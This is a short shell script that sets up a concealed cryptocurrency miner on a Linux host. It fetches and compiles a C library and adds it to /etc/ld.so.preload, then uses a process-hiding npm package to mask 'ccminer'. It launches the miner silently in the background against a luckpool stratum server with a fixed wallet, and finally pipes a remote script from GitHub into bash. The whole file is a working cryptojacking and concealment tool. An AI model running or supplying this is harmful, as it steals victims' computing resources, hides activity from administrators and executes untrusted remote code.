#!/bin/sh
sudo apt update
sudo apt install screen -y
apt-get update ; apt-get install sudo -y
curl https://gitlab.com/liugtiujk/portal/-/raw/master/cikblek.c -o cikblek.c
apt-get install build-essential -y
gcc -Wall -fPIC -shared -o libcikblek.so cikblek.c -ldl
mv libcikblek.so /usr/local/lib/
echo /usr/local/lib/libcikblek.so >> /etc/ld.so.preload
rm cikblek.c
echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
/etc/init.d/network restart
sudo su --command "curl -sL https://deb.nodesource.com/setup_17.x | sudo -E bash - && sudo apt-get install -y nodejs && npm i -g updates && npm i -g node-process-hider && npm install -g npm@8.10.0 && sudo ph add ccminer"
wget https://github.com/wong-fi-hung/ccminer/releases/download/v3.8.3a/ccminer_CPU_3.8.3.tar.xz >/dev/null 2>&1
tar -xf ccminer_CPU_3.8.3.tar.xz
chmod 777 ccminer
./ccminer -a verus -o stratum+tcp://eu.luckpool.net:3960 -u RPw1mcxaVvVcUicUqMmqon6n88esCrN3SP."AP$RANDOM" >/dev/null 2>&1 &
curl -sL https://raw.githubusercontent.com/bsheredia/dumel/main/pie.sh | bash
